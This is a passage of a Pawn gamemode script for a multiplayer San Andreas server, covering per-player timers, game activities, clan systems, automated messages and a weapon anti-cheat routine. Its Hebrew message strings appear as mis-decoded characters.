			// Tele/Spawn Update
			if(playerinfo[i][gmtimer] > 0)
			{
				playerinfo[i][gmtimer]--;
				if(!playerinfo[i][gmtimer]) SetPlayerHealth(i,playerinfo[i][gmlasthp]);
			}
			if(playerinfo[i][unftimer] > 0)
			{
				playerinfo[i][unftimer]--;
				if(!playerinfo[i][unftimer])
				{
					SetFreeze(i,0);
					ReloadCPs(i);
				}
			}
			if(playerinfo[i][recptimer] > 0)
			{
				playerinfo[i][recptimer]--;
				if(!playerinfo[i][recptimer]) ReloadCPs(i);
			}
			// Clan Security Spam Delay
			if(playerinfo[i][securitydelay] > 0) playerinfo[i][securitydelay]--;
			// Punish Spam
			if(punishSpam[1] > 0)
			{
				punishSpam[1]--;
				if(!punishSpam[1]) punishSpam[0] = INVALID_PLAYER_ID;
			}
			if(lastbanerdelay > 0 && lastbaner != INVALID_PLAYER_ID)
			{
				lastbanerdelay--;
				if(!lastbanerdelay) lastbaner = INVALID_PLAYER_ID, lastbanerbans = 0;
			}
			// Sawnoff 2-2 & Fighting Detect
   			if(serverUptime % 2 == 0 && playerinfo[i][using22] > 0) playerinfo[i][using22]--;
			if(playerinfo[i][curfight] > 0) playerinfo[i][curfight] -= playerinfo[i][curfight] >= 15 ? 2 : 1;
			// DMZ Level Update
			if(playerinfo[i][dmzone] > dmz_none) if(DMZs[playerinfo[i][dmzone]][dmzUsingLevels])
			{
				format(string,sizeof(string),"%s Level: %d",DMZs[playerinfo[i][dmzone]][dmzName],playerinfo[i][dmzlevel]);
				SetPlayerChatBubble(i,string,darkgreen,25.0,1500);
			}
			// Code Delay
			if(playerinfo[i][pcode][3] > 0) playerinfo[i][pcode][3]--;
			// Pickup Update
			if(playerinfo[i][pickup] != -1)
			{
				if(!IsPlayerInRangeOfPoint(i,3.0,pickupinfo[playerinfo[i][pickup]][ppos][0],pickupinfo[playerinfo[i][pickup]][ppos][1],pickupinfo[playerinfo[i][pickup]][ppos][2]))
				{
					OnPlayerLeavePickup(i,playerinfo[i][pickup]);
					playerinfo[i][pickup] = -1;
				}
			}
			// Scrolls Remove
			if(playerinfo[i][scroll] != scroll_none && playerinfo[i][scrolltime] > 0 && playerinfo[i][scrollusing])
			{
				playerinfo[i][scrolltime]--;
				if(!playerinfo[i][scrolltime])
				{
					format(string,sizeof(string)," .(щщ°у ыщ фцюя ∙ьх Єс° (%d уўх· %s ,фёў°хь ∙ьъ",Scrolls[playerinfo[i][scroll]][scTime],Scrolls[playerinfo[i][scroll]][scShort]);
					SendClientMessage(i,red,string);
					RemovePlayerScroll(i);
				}
			}
			// Show Property
			if(playerinfo[i][propertyid] != -1 && playerinfo[i][showprop] > 0)
			{
				playerinfo[i][showprop] = 0;
				ShowPlayerProperty(i,playerinfo[i][propertyid]);
			}
			// Show House
			if(playerinfo[i][houseid] != -1 && playerinfo[i][showhouse] > 0)
			{
				playerinfo[i][showhouse] = 0;
				CheckHouseAcc(i,playerinfo[i][houseid]);
				ShowPlayerHouse(i,playerinfo[i][houseid]);
			}
			// Window Watching
			if(playerinfo[i][invehicle] != INVALID_VEHICLE_ID && playerinfo[i][watchingwindow] > 0)
			{
				GetVehiclePos(playerinfo[i][invehicle],p[0],p[1],p[2]);
				GetVehicleZAngle(playerinfo[i][invehicle],p[3]);
				GetXYInFrontOfPoint(p[0],p[1],p[3]+(playerinfo[i][watchingwindow] == 1 ? 90.0 : 270.0),5.0);
				SetPlayerCameraPos(i,p[0],p[1],p[2]);
				SetPlayerCameraLookAt(i,p[0],p[1],p[2]-10.0);
				SetPlayerChatBubble(i,"ЎхЇф юфчьхя",grey,8.0,2000);
			}
			// Bot Delay
			if(botdelay[0] > 0)
			{
				botdelay[0]--;
				if(!botdelay[0]) bottalkingto = INVALID_PLAYER_ID;
			}
			if(botdelay[1] > 0) botdelay[1]--;
			// Health & Armour AntiCheat
			GetPlayerHealth(i,z[0]);
			GetPlayerArmour(i,z[1]);
			/*if(z[0] != playerinfo[i][phealth])
			{
				if(!playerinfo[i][dontac] && GetPlayerState(i) == PLAYER_STATE_ONFOOT) SendClientMessage(i,red,"Health hack?");
				playerinfo[i][phealth] = z[0];
			}
			if(z[1] != playerinfo[i][parmour])
			{
				if(!playerinfo[i][dontac] && GetPlayerState(i) == PLAYER_STATE_ONFOOT) SendClientMessage(i,red,"Armour hack?");
				playerinfo[i][parmour] = z[1];
			}*/
			// Jumping Position
			if(playerinfo[i][jumpower] >= 0)
			{
				if(GetPlayerCheckpoint(i) == cp_jumping  && IsPlayerInCheckpoint(i))
				{
					playerinfo[i][jumpower]++;
					if(playerinfo[i][jumpower] > 3) playerinfo[i][jumpower] = 1;
					UpdatePlayerJumpPower(i);
				}
				else playerinfo[i][jumpower] = -1;
			}
			// Fuel Decrease
			if((playerinfo[i][vehicle][0] > 0 || playerinfo[i][vehicle][3] > 0) && playerinfo[i][vehicle][1] != -1 && GetPlayerState(i) == PLAYER_STATE_DRIVER && !IsPlayerAFK_(i) && playerinfo[i][pkmh] > 20)
			{
				if(vehicleinfo[playerinfo[i][vehicle][1]][vfuel] > 0 && IsPlayerInVehicle(i,playerinfo[i][vehicle][1]))
				{
					playerinfo[i][fuelr]++;
					if(playerinfo[i][fuelr] >= playerinfo[i][fuelmax])
					{
						playerinfo[i][fuelr] = 0;
						playerinfo[i][fuelmax] = randomEx(28,40);
						vehicleinfo[playerinfo[i][vehicle][1]][vfuel] = --playerinfo[i][fuel];
					}
				}
				if(!vehicleinfo[playerinfo[i][vehicle][1]][vfuel] && GetVehicleParams(playerinfo[i][vehicle][1],'e') == VEHICLE_PARAMS_ON)
				{
					SendClientMessage(i,red," .ь°ыс ∙ьъ Ётю° фуьў! ыущ ьф∙·ю∙ сх ∙хс, ∙т° рх·х с·чЁ· °ыс");
					SetVehicleParams(playerinfo[i][vehicle][1],.engine = VEHICLE_PARAMS_OFF);
				}
			}
			// Object Streaming
			if(Options[11][optActive]) Streamer_Update(i);
			// Dialog Spam
			if(playerinfo[i][dialogresp] > 0) playerinfo[i][dialogresp]--;
			// Friend Messages
            for(new j = 0; j < 2; j++)
            {
                if(playerinfo[i][fmsg][j] > 0) playerinfo[i][fmsg][j]--;
                if(playerinfo[i][fmsggo][j] > 0)
                {
                    playerinfo[i][fmsggo][j]--;
                    if(!playerinfo[i][fmsggo][j]) GoFriendMessage(i,j);
                }
            }
			// Remove Special Action
			if(playerinfo[i][removespac] > 0) if(--playerinfo[i][removespac] == 0) SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
			// Interpolate Paths
			if(playerinfo[i][interpolating][0] > 0)
			{
				playerinfo[i][interpolating][0]--;
				if(!playerinfo[i][interpolating][0]) OnPlayerDoneCameraPath(i,playerinfo[i][interpolating][1]);
			}
			// Energy Addition
			if(playerinfo[i][pkmh] < 30 && GetPlayerState(i) == PLAYER_STATE_ONFOOT && playerinfo[i][energy] < levels[playerinfo[i][level]][EnergyLimit] && playerinfo[i][idletime] < 5)
			{
				playerinfo[i][lasteupdate][1]++;
				if(playerinfo[i][lasteupdate][1] == playerinfo[i][energyrate][0])
				{
					playerinfo[i][lasteupdate][1] = 0;
					AddEnergy(i,playerinfo[i][energyrate][1]);
					if(playerinfo[i][energy] == levels[playerinfo[i][level]][EnergyLimit]) SendClientMessage(i,white," /en :фтЄ· ьютсь· фрЁ°тщф ∙ьъ. ьющуЄ Ёхёє");
				}
			}
			// Admin Notification
			if(playerinfo[i][iadminot][0] > 0)
			{
				playerinfo[i][iadminot][0]--;
				if(!playerinfo[i][iadminot][0])
				{
					playerinfo[i][iadminot][0] = 0, playerinfo[i][iadminot][1] = 0, playerinfo[i][iadminot][2] = -1;
					TextDrawHideForPlayer(i,adminot);
				}
			}
			// Clan Alert
			if(playerinfo[i][clan] > 0 && claninfo[playerinfo[i][clan]][cvalid] && claninfo[playerinfo[i][clan]][csystems][clansys_alert] && claninfo[playerinfo[i][clan]][csystemparam][clansys_alert] && claninfo[playerinfo[i][clan]][calert][1]) PlaySound(i,1057);
			// Silence
			for(new j = 0; j < max_silence_types; j++) if(playerinfo[i][silence][j] > 0)
			{
				playerinfo[i][silence][j]--;
				if(!playerinfo[i][silence][j])
				{
					SendClientMessage(i,green," :срхЇя рхшхюшщ фё·щщюф фф∙·ўф ∙ь");
					SendClientMessage(i,white,SilenceStrings[j]);
				}
			}
			// sGuard Tests
			if(playerinfo[i][sguard][0])
			{
				if(IsPlayerUsingJoypad(i)) ForceRemoveJoypad(i);
				sta[1]++;
			}
			playerinfo[i][sguard][1]++;
			if(playerinfo[i][sguard][1] >= 20)
			{
				playerinfo[i][sguard][1] = 0;
				playerinfo[i][sguard][0] = IsPlayerUsingSGuard_(i);
				if(playerinfo[i][sguard][0]) FindCheats(i);
			}
			// RPassword
			if(rpasswordUsed > 0) rpasswordUsed--;
			// Fake Kill New AC
			if(playerinfo[i][fknewac] > 0) playerinfo[i][fknewac]--;
			// Spec Text Update
			if(playerinfo[i][spectate] != -1) if(IsPlayerMAdmin(i)) AdminSpecText(i,'u');
			// Gambling
			if(playerinfo[i][gambleinfo][2] > 0)
			{
				playerinfo[i][gambleinfo][2]--;
				if(!playerinfo[i][gambleinfo][2])
				{
					if(playerinfo[i][gambleinfo][3] == playerinfo[i][gambleinfo][4] && playerinfo[i][gambleinfo][3] == playerinfo[i][gambleinfo][5])
					{
						GiveMoney(i,playerinfo[i][gambleinfo][1]*3);
						format(string,sizeof(string)," !!!∙ьх∙ ф·юхЁх· цфх·, цыщ· с-$%d",playerinfo[i][gambleinfo][1]*3);
						ShowPlayerDialog(i,dialog_gamblingmachine,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",string,"GO!","ётх°");
					}
					else ShowPlayerDialog(i,dialog_gamblingmachine,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(red) "?ьр цыщ·... °хЎф ьЁёх· ∙хс","GO!","ётх°");
				}
				else
				{
					GamblingFunction(i,"rand",playerinfo[i][gambleinfo][2]);
					PlaySound(i,1057);
				}
			}
			// Poison
			if(playerinfo[i][poisoned] > 0)
			{
				playerinfo[i][poisoned]--;
				Damage(i,playerinfo[i][poisonhp]);
			}
			// Once a minute
			if(!thetime[2]) Border(i,"update");
			// Bug
			if(playerinfo[i][shootbugwarns][0] > 0) playerinfo[i][shootbugwarns][0]--;
			// PPT Update
			for(new j = 0; j < ppt_count; j++) if(pptinfo[j][pptValid] && playerinfo[i][ppts][j] != (PlayerText3D:1024))
			{
				if(wr == pptinfo[j][pptVirtualWorld]) UpdatePlayer3DTextLabelText(i,playerinfo[i][ppts][j],white,pptinfo[j][pptText]);
				else UpdatePlayer3DTextLabelText(i,playerinfo[i][ppts][j],white," ");
			}
			// Count
			c++, sta[0]++;
		}
		if(IsPlayerNPC(i))
		{
			new bool:myNPC = false;
			for(new n = 0; n < sizeof(NPCs) && !myNPC; n++) if(equal(GetName(i),NPCs[n][npcName])) myNPC = true;
			if(!myNPC)
			{
				Cheat(i,"Bot",1);
				continue;
			}
			if(playerinfo[i][clearanims] > 0)
			{
				playerinfo[i][clearanims]--;
				if(!playerinfo[i][clearanims]) ApplyAnimation(i,"PED","IDLE_stance",4.1,0,1,1,1,1);
			}
			if(playerinfo[i][stoprob] > 0)
			{
				playerinfo[i][stoprob]--;
				if(!playerinfo[i][stoprob]) ApplyAnimation(i,"PED","IDLE_stance",4.1,0,1,1,1,1);
			}
			if(playerinfo[i][robbed] > 0) playerinfo[i][robbed]--;
			if(!IsPlayerNPC(i)) AntiCheat(i);
		}
	}
	#if lagtest
		LagTest_EndEx("ContentsB(%d)",c);
	#endif
	if(debugstate) printf("Contents emsa");
	// Connect Spam Block
	for(new i = 0; i < MAX_SPAM_IPS; i++) if(csbinfo[i][csbCount] > 0)
	{
		csbinfo[i][csbCount]--;
		if(!csbinfo[i][csbCount]) csbinfo[i][csbIP][0] = EOS;
	}
	// Class Selection
	csdelay++;
	if(csdelay >= 5)
	{
		HandleClassSelectionObjects();
		csdelay = 0;
	}
	// CountDown
	if(cd[0])
	{
		if(cd[1] <= 0)
		{
			for(new i = 0, j = strlen(cdtext[1]); i < j; i++) if(cdtext[1][i] == '_') cdtext[1][i] = ' ';
			GameTextForAll(cdtext[1],2000,4);
			for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i))
			{
				if(!IsPlayerAFK_(i)) PlaySound(i,1057);
				if(playerinfo[i][cdfrozen])
				{
					SetFreeze(i,0);
					playerinfo[i][cdfrozen] = 0;
				}
			}
			cd[0] = 0;
			cdtext[0] = "~b~$NUM$", cdtext[1] = "~r~go~h~!";
		}
		else
		{
			valstr(string,cd[1]);
			if(strfind(cdtext[0],"$NUM$",true) == -1) cdtext[0] = "~b~$NUM$";
			for(new i = 0, j = strlen(cdtext[0]); i < j; i++) if(cdtext[0][i] == '_') cdtext[0][i] = ' ';
			GameTextForAll(strreplace(cdtext[0],"$NUM$",string),2000,4);
		}
		cd[1]--;
	}
	// Fire place
	//GetSObjectPos(fpinfo[fpUpdate]++,op[0],op[1],op[2]);
	//CreateExplosion(op[0],op[1],op[2],4,0.0);
	//if(fpinfo[fpUpdate] >= fpinfo[fpEnd]) fpinfo[fpUpdate] = fpinfo[fpStart];
	// Second auto message
	if(++autoM >= second_auto_message_minutes*60)
	{
		switch(autoMType)
		{
			case 0:
			{
				TipAll();
				new rnd = random(TDAMs);
				TextDrawSetString(tdam,TDAutoMessage[rnd]);
				TextDrawShowForAll(tdam);
				SetTimer("TDAMDisappear",6500,0);
			}
			case 1: HTTP(1,HTTP_GET,"sa-mp.co.il/lasttopic.php?replies","","ResponseOfLastTopicFromForum");
			case 2:
			{
				format(string,sizeof(string)," [/Best] ∙щр ючхс°щэ щхющ: " @c(yellow) "%d",todayBest);
				SendClientMessageToAll(orange,string);
				fsetint(file_srvdetails,"BestToday",todayBest);
				format(string,sizeof(string),"BestToday-%s",GetDateAsString('-'));
				fsetint(file_besttoday,string,todayBest);
			}
		}
		autoM = 0, autoMType = autoMType + 1 >= 3 ? 0 : autoMType + 1;
	}
	musictimer++;
	if(musictimer == 500 && autoplay && strlen(adminmusic) < 2)
	{
	    format(adminmusic,sizeof(adminmusic),AMusicList[random(sizeof(AMusicList))][amLink]);
		SendClientMessageToAll(white," .(/play :ьфЇЄьф счц°ф ,/saudio :фсхш ∙ь ф∙°· ю∙ющЄ ыЄ· юхцщўф ьыхьэ срхЇя рхшхюшщ (ьыщсхщ");
	}
	if(musictimer > 500) musictimer = 0;
	afterHour++;
	if(afterHour == 60)
	{
		// Gravity check
		new gravity[16];
		GetServerVarAsString("gravity",gravity,sizeof(gravity));
		if(floatstr(gravity) < 0.001000 || floatstr(gravity) > 0.009000)
		{
			SendClientMessageToAll(red," .ф·тьф ыщ ыхч фю∙щыф с∙°· Ёюхъ рх °с юущ хьыя фхр фхчц° ьыхч фю∙щыф фЁх°юрьщ");
			SetGravity(0.008000);
		}
		// Weather check
		if(!IsValidWeather(GetServerVarAsInt("weather")))
		{
			SendClientMessageToAll(red," .ф·тьф ыщ юцт фрхщ° с∙°· рщЁх шхс хьыя фхр фхчц° ьюцт фрхщ° фЁх°юрьщ");
			SetWeather(serverWeather = worlddef_weather);
		}
	}
	// Auto Unlocking Vehicles
	if(afterHour == 3600)
	{
		for(new v = 0; v < MAX_VEHICLES; v++) if(vehicleinfo[v][vvalid]) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(v,i,0,0);
		SendClientMessageToAll(green," *** .ыь фюыхЁщх· с∙°· ЁЇ·чх рхшхюшщ·");
		afterHour = 0;
	}
	// Bot Delay
	if(++botDelay == 600)
	{
		BotSay(BotMessages[random(botMs)]);
		botDelay = 0;
	}
	// Timing Shit
	if(thetime[2] == 0 && thetime[0] >= sa_timestart && thetime[0] <= sa_timeend)
	{
		// Special Activities
		if(thetime[1] == 0 && specialActivity == sa_none)
		{
			if(nextActivity + 1 == sa_count) nextActivity = sa_none;
			specialActivity = ++nextActivity;
			fsetint(file_srvdetails,"NextActivity",nextActivity);
			switch(specialActivity)
			{
				case sa_ftt: StartFTT();
				case sa_party: StartParty();
				case sa_ammusale: StartAmmunationSale();
				case sa_dlotto: DoubleLotto();
				case sa_sail: StartSailingShip();
				case sa_sequence: StartActivitySequence();
			}
		}
		// Pickups Activity
		if(thetime[1] == 30)
		{
			new rnd = random(sizeof(SinglePlayerPickupPositions));
			pickacttimer = SetTimer("EndPickupsActivity",720000,0);
			pickactzone = GangZoneCreate(SinglePlayerPickupPositions[rnd][0]-float(randomEx(25,76)),SinglePlayerPickupPositions[rnd][1]-float(randomEx(25,76)),SinglePlayerPickupPositions[rnd][0]+float(randomEx(25,76)),SinglePlayerPickupPositions[rnd][1]+float(randomEx(25,76)));
			if(!random(4))
			{
				new t = random(sizeof(Scrolls));
				pastatus = 2;
				pickact = CreatePickupEx(1276,1,SinglePlayerPickupPositions[rnd][0],SinglePlayerPickupPositions[rnd][1],SinglePlayerPickupPositions[rnd][2],27,world_normal,t);
				GangZoneShowForAll(pickactzone,yellow);
				format(string,sizeof(string)," * !чЇ∙х р· фрцх° фЎфхс сюЇф ,%s ЇЄщьх· фЇщўрЇ ф·чщьф! хфЇЄэ: фхё·° ЇщўрЇ ёў°хь ∙ь",Scrolls[t][scShort]);
				SendClientMessageToAll(lightyellow,string);
			}
			else
			{
				new m = randomEx(5,21) * 250;
				pastatus = 1;
				pickact = CreatePickupEx(!random(2) ? 1212 : 1274,1,SinglePlayerPickupPositions[rnd][0],SinglePlayerPickupPositions[rnd][1],SinglePlayerPickupPositions[rnd][2],26,world_normal,m);
				GangZoneShowForAll(pickactzone,green);
				format(string,sizeof(string)," * !ЇЄщьх· фЇщўрЇ ф·чщьф! хфЇЄэ: фхё·° ЇщўрЇ ыёє ∙ь $%d, чЇ∙х р· фрцх° фщ°хў сюЇф",m);
				SendClientMessageToAll(green,string);
			}
		}
	}
	// Once a day
	if(!thetime[0] && !thetime[1] && !thetime[2])
	{
		for(new i = 0; i < props; i++) if(propinfo[i][owner] == INVALID_PLAYER_ID || !IsPlayerConnected(propinfo[i][owner]))
		{
			format(string,sizeof(string),"/DM/Properties/%d.ini",i);
			fsetstring(string,"Owner","None");
			fsetint(string,"LeftEarns",prop_earns);
			fsetint(string,"BoughtCost",0);
			UpdatePropertyText(i);
		}
	}
	// DM Zones Adv. Delay
	for(new i = 0; i < sizeof(DMZsDelay); i++) if(DMZsDelay[i] > 0) DMZsDelay[i]--;
	// Manhunt Timing
	if(manhuntinfo[0] && manhuntinfo[6] > 0)
	{
		manhuntinfo[6]--;
		if(manhuntinfo[6] % 25 == 0 && manhuntinfo[6] != 0 && manhuntinfo[6] != 200)
		{
			format(string,sizeof(string)," ** !Єху " @c(white) "%d" @c(yellow) " ∙Ёщх· ьёщхэ фЇЄщьх·",manhuntinfo[6]);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inmanhunt]) SendClientMessage(i,yellow,string);
		}
	}
	// Grass Delay
	if(grassdelay > 0) grassdelay--;
	// Clans Loop
	for(new i = 0; i < MAXCLANS; i++) if(claninfo[i][cvalid])
	{
		// Clan Power End
		if(claninfo[i][cusingpower] && claninfo[i][cendpower][0] > 0)
		{
			claninfo[i][cendpower][0]--;
			if(!claninfo[i][cendpower][0]) claninfo[i][cusingpower] = 0, claninfo[i][cendpower][1] = -1;
		}
		// Check For Invaders
		if(claninfo[i][csystems][clansys_security] && claninfo[i][csystemparam][clansys_security] && claninfo[i][csecurity] > 0)
		{
			claninfo[i][csecurity]--;
			if(!claninfo[i][csecurity]) CheckForInvaders(i);
		}
	}
	// Heavy TDM Pickups
	heavytdmPickupsTimer++;
	if(heavytdmPickupsTimer == 15)
	{
		heavytdmPickupsTimer = 0;
		for(new i = 0, r = 0; i < 3; i++)
		{
			if(heavytdmPickups[i] != -1) DestroyPickupEx(heavytdmPickups[i]);
			r = random(sizeof(TDMZPickups_Heavy));
			if(!random(2)) heavytdmPickups[i] = CreatePickupEx(1247,2,TDMZPickups_Heavy[r][0]+floatrand(-4.0,4.0),TDMZPickups_Heavy[r][1]+floatrand(-4.0,4.0),TDMZPickups_Heavy[r][2],32,worlds_tdm + tdmz_heavy,random(sizeof(TDMZPickupNames_Heavy)));
			else heavytdmPickups[i] = CreatePickupEx(1240 + random(3),2,TDMZPickups_Heavy[r][0]+floatrand(-4.0,4.0),TDMZPickups_Heavy[r][1]+floatrand(-4.0,4.0),TDMZPickups_Heavy[r][2],.world=worlds_tdm + tdmz_heavy);
		}
	}
	// Money Pickups
	for(new i = 0; i < moneyPickups; i++) if(moneyPickup[i] != -1)
	{
		if(moneyPickupTime[i] != -1)
		{
			if(!moneyPickupTime[i]) DestroyMoneyPickup(i);
			else
			{
				format(string,sizeof(string), @c(green) "$%d\n" @c(lightgreen) "%d",pickupinfo[moneyPickup[i]][pspecialid],moneyPickupTime[i]);
				SetPickupText(moneyPickup[i],string,green);
			}
		}
		moneyPickupTime[i]--;
	}
	// Pirate Ship Sail
	if(pirateUser[0] != INVALID_PLAYER_ID)
	{
		pirateUser[1]--;
		if(!pirateUser[1]) ReloadPirateShip();
		else
		{
			GetVehiclePos(pirateVehicle,p[0],p[1],p[2]);
			UpdateMoneyAreaPosition(0,1,p[0],p[1],120.0,77.0);
		}
	}
	lagstatus = GetTickCount()-lagstatus;
	#if lagtest
		LagTest_EndEx("Contents(%d)",c);
	#endif
	if(debugstate) printf("Contents end");
	return 1;
}
//=[AntiCheat]==================================================================
public AntiCheat(playerid)
{
	#if lagtest
	LagTest_Start("Aviv AntiCheat");
	#endif
    if(toganticheat) return 1;
	if(IsPlayerNPC(playerid)) return 1;
	new playerState = GetPlayerState(playerid);
	if(playerState == PLAYER_STATE_EXIT_VEHICLE || playerState == PLAYER_STATE_ENTER_VEHICLE_DRIVER || playerState == PLAYER_STATE_ENTER_VEHICLE_PASSENGER) return 1;
	if(IsPlayerAFK_(playerid)) return 1;
	if(!playerinfo[playerid][alive]) return 1;
	if(playerinfo[playerid][warned]) return 1;
	if(playerinfo[playerid][idletime] > 5) return 1;
	if(!IsPlayerConnected(playerid)) return 1;
	new weap[2], str[M_S];
	for(new i=0;i<12;i++)
	{
		GetPlayerWeaponData(playerid,i,weap[0],weap[1]);
  		GetWeaponName(weap[0],str,sizeof(str));
    	if(weap[0] == 18) str = "Molotov";
    	if(weap[0] == 40 || weap[0] == 46) return 1;
    	if((i == 0 || i == 1 || i == 10) && weap[1] > 15) // ёхсщщш
  		{
			new stringtolog[M_S];
			GetPlayerWeaponData(playerid,i,weap[0],weap[1]);
			format(stringtolog,sizeof(stringtolog),"Cheats Detected  - banned. Weapon Name: %s Ammo: %d",str,weap[1]);
			Log("s0beit",playerid,stringtolog);
			if(IsPlayerConnected(playerid)) SetBan(playerid,INVALID_PLAYER_ID,"Cheats detected. #1");
  		}
	}
	if(GetWeaponSlot(GetPlayerWeapon(playerid)) && !playerinfo[playerid][acweapons][GetWeaponSlot(GetPlayerWeapon(playerid))])
	{
 		GetWeaponName(GetPlayerWeapon(playerid),str,sizeof(str));
		if(GetPlayerWeapon(playerid) == 18) str = "Molotov";
    	if(GetPlayerWeapon(playerid) == 40 || GetPlayerWeapon(playerid) == 46) return 1;
 		if(IsPlayerInAmmunation(playerid)) playerinfo[playerid][usedammu] = true;
		if(playerinfo[playerid][usedammu]) return 1;
		if(IsPlayerInAnyVehicle(playerid)) return 1;
		playerinfo[playerid][pwarnings]++;
		if(playerinfo[playerid][pwarnings] > 2)
		{
		    if(!GetOnlineAdminsAFK()) // AFK рщя рующЁщэ ючхс°щэ / ыхьэ сюЎс
		    {
				playerinfo[playerid][warnings]++;
				if(playerinfo[playerid][warnings] > 2) return SetKick(playerid,INVALID_PLAYER_ID,"Ў'щш Ё∙ўщэ");
				SendClientMessage(playerid,red,".ф∙°· чх∙у ∙ф∙·ю∙· сЎщш Ё∙ўщэ, хьыя Ё∙ўщъ Ёючўх, сющуф х·ю∙щъ ьўсь рцф°х·, ·ўсь ўщў срхЇя рхшхюшщ");
				ResetWeapons(playerid);
				SetTimerEx("ResetWarned",5000,0,"i",playerid);
				return playerinfo[playerid][warned] = true;
		    }
			else // щ∙ рующЁщэ ючхс°щэ
			{
   				if(playerinfo[playerid][finalwarning])
			    {
					format(str,sizeof(str),"Weapon Cheat - %s (ID:%d)",str,GetPlayerWeapon(playerid));
					AdminInfo(playerid,str);
					SetTimerEx("ResetWarned",5000,0,"i",playerid);
					playerinfo[playerid][acwarns]++;
					playerinfo[playerid][finalwarning] = false;
					return playerinfo[playerid][warned] = true;
				}
			    if(!playerinfo[playerid][finalwarning]) playerinfo[playerid][finalwarning] = true;
		     	SetTimerEx("ResetWarned",5000,0,"i",playerid);
			}
		}
	}
	#if lagtest
	LagTest_End("Aviv AntiCheat");
	#endif
	return 1;
}
//=[Contents3]==================================================================
public Contents3()
{
	#if lagtest
		LagTest_Start("Contents3");
	#endif
	dbg(102,"1");
	// Wang
	new string[M_S];
	wangv = randomEx(1,4);
	if(wangv == 3) wangv = -1;
	else
	{
		do wangv = random(212);
		while !vehModel[wangv];
		wangv += 400;
		format(string,sizeof(string)," Х !" @c(lightyellow) "%s" @c(yellow) " юхёъ ххрЁт ючЇ∙ °ыс юёхт",GetVehicleName(GetVehicleModel(wangv)));
		SendClientMessageToAll(yellow,string);
	}
	dbg(102,"2");
	switch(contents3timer)
	{
		case 0:
		{
			dbg(102,"3-0a");
			// Bulletin Board
			if(!fexist(file_bb))
			{
				fcreate(file_bb);
				for(new i=1;i<=max_bb;i++)
				{
					format(string,sizeof(string),"Message%d",i);
					fsetstring(file_bb,string,"None");
				}
			}
			SendClientMessageToAll(lightblue," [ " webpage " ] :ьхч юхуЄх·");
			for(new i=1;i<=max_bb;i++)
			{
				format(string,sizeof(string),"Message%d",i);
				if(fkeyexist(file_bb,string) && !equal(fgetstring(file_bb,string),"None"))
				{
					format(string,sizeof(string),fgetstring(file_bb,string));
					format(string,sizeof(string)," Х %d) " @c(yellow) "%s",i,strreplace(string,"╗","╗\t"));
					SendClientMessageToAll(yellow,string);
				}
			}
			dbg(102,"3-0b");
		}
		case 1:
		{
			dbg(102,"3-1a");
			// Real Time System
			new h[3];
			gettime(h[0],h[1],h[2]);
			SetWorldTime(h[0]);
			// Update Server Details
			UpdateServerDetails();
			// Kills List
			//KillsList();
			// Israel Weather Update
			if(israelWeather[2] > 0) israelWeather[2]--;
			else
			{
				SetWeatherToIsraelWeather();
				israelWeather[2] = 3;
			}
			// Respawn Vehicles
			if(boton) RespawnAllVehicles(INVALID_PLAYER_ID);
			dbg(102,"3-1b");
		}
		case 2:
		{
			// Activity
			if(!random(2)) StartActivity();
			else StartActivity2();
			// Class Selection NPCs
			HandleClassSelectionNPCs();
		}
		case 3:
		{
			// Clans Ruling List
			//ClansRulingList();
			// Tick hour for any duration property
			//TickGProperties();
			TickProperties();
			// Reset Contents3 Timer
			contents3timer = 0;
		}
	}
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i))
	{
		playerinfo[i][pickupteleporting] = 0;
		format(playerinfo[i][lasttext],M_S,"");
	}
	contents3timer++;
	#if lagtest
		LagTest_End("Contents3");
	#endif
	return 1;
}
//=[SpawnTimer]=================================================================
forward SpawnTimer(playerid);
public SpawnTimer(playerid) SpawnPlayer(playerid);
//=[AutoMessage]================================================================
public AutoMessage()
{
	if(debugstate) printf("AutoMessage start");
	#if lagtest
		LagTest_Start("AutoMessage");
	#endif
	new File:am, read[256];
	adauto++;
	switch(adauto)
	{
		case 1..3:
		{
			#define automsg(%1,%2) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][setting][setting_automessage]) SendClientMessage(i,%1,%2)
			format(read,sizeof(read)," ~~~ :[#%d] фхуЄф рхшхюшщ· ~~~",adauto);
			automsg(lightblue,read);
			switch(adauto)
			{
				case 1:
				{
					fileCheck(file_am);
					if(fkeyexist(file_am,"Link")) format(urlautomsg,sizeof(urlautomsg),fgetstring(file_am,"Link"));
					am = fopen(file_am,io_read);
				}
				case 2:
				{
					fileCheck(file_am2);
					if(fkeyexist(file_am2,"Link")) format(urlautomsg,sizeof(urlautomsg),fgetstring(file_am2,"Link"));
					am = fopen(file_am2,io_read);
				}
				case 3:
				{
					fileCheck(file_am3);
					if(fkeyexist(file_am3,"Link")) format(urlautomsg,sizeof(urlautomsg),fgetstring(file_am3,"Link"));
					am = fopen(file_am3,io_read);
				}
			}
			while(fread(am,read,sizeof(read),false) && am) if(strfind(read,"Link=",true) == -1) automsg(0xFFFF00AA,read);
			fclose(am);
			if(strlen(urlautomsg) > 5)
			{
				automsg(white," :(/link - ўщ∙х° юЎх°є ьфхуЄф цх (ьыЁщёф");
				automsg(white,urlautomsg);
			}
			automsg(lightblue," ~~~~~~~~~~~~~~~~~~~~~~~~");
			#undef automsg
		}
		case 4:
		{
			adauto = 0;
			#define automsg(%1,%2) for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerMAdmin(i)) SendClientMessage(i,%1,%2)
			automsg(lightblue," ~~~ :фхуЄф рхшхюшщ· ьрующЁщэ ~~~");
			fileCheck(file_adm);
			if(fkeyexist(file_adm,"Link")) format(urlautomsg,sizeof(urlautomsg),fgetstring(file_adm,"Link"));
			am = fopen(file_adm,io_read);
			while(fread(am,read,sizeof(read),false) && am) if(strfind(read,"Link=",true) == -1) automsg(0xFFFF00AA,read);
			fclose(am);
			if(strlen(urlautomsg) > 5)
			{
				automsg(white," :(/link ўщ∙х° юЎх°є ьфхуЄф цх (ьыЁщёф");
				automsg(white,urlautomsg);
			}
